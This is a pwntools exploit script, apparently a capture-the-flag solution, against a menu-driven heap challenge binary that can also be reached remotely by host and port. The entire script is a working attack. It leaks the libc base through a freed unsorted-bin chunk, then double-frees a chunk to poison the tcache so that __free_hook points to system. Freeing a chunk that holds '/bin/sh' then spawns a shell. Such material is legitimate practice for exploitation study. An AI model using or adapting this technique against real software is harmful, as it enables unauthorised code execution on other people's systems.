from pwn import *
context(os='linux', arch='i386', kernel='amd64')
context.terminal = ['tmux', 'splitw', '-h']
fname = args.FNAME if args.FNAME else './vuln'
libname = args.LIB if args.LIB else '/lib/x86_64-linux-gnu/libc.so.6'
ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

def pid_pause():
    if not args.REMOTE:
        log.info('PID: %d' % io.proc.pid)
    pause()

s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def opt(idx):
    sla(b'choice:', str(idx).encode())

def create(idx, sz, content):
    opt(1)
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(sz).encode())
    sa(b'Content: ', content)

def edit(idx, content):
    pass # not support

def show(idx):
    opt(2)
    sla(b'Index: ', str(idx).encode())

def delete(idx):
    opt(3)
    sla(b'Index: ', str(idx).encode())

def exp():
    # leak libc
    [create(i, 0x80, b'leak') for i in range(9)]
    [delete(i) for i in range(8)]
    show(7)

    addr_arena = u64(rl()[:-1].ljust(8, b'\x00')) - 96
    libc.address = addr_arena - 0x1ecb80
    log.success(f'libc base: {hex(libc.address)}')

    delete(9)
    [create(i, 0x80, b'retake all 0x90 chunk, aoivding split.') for i in range(9)]

    # now the bin & tcache are empty
    addr_system = libc.sym.system
    free_hook = libc.sym['__free_hook']

    [create(i, 0x68, b'aaa') for i in range(9)]
    [delete(i) for i in range(9)]
    delete(7)

    # empty tcache[0x68]
    [create(0, 0x68, b'bbb') for _ in range(7)]
    
    # malloc will take chunks from fastbin into tcache as many as possible
    create(0, 0x68,p64(free_hook))
    
    # now in tcache: B->A->free_hook
    [create(1, 0x68, b'/bin/sh') for i in range(2)]

    # pid_pause()
    # now tcache: free_hook
    create(2, 0x68, p64(addr_system))

    delete(1)

if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()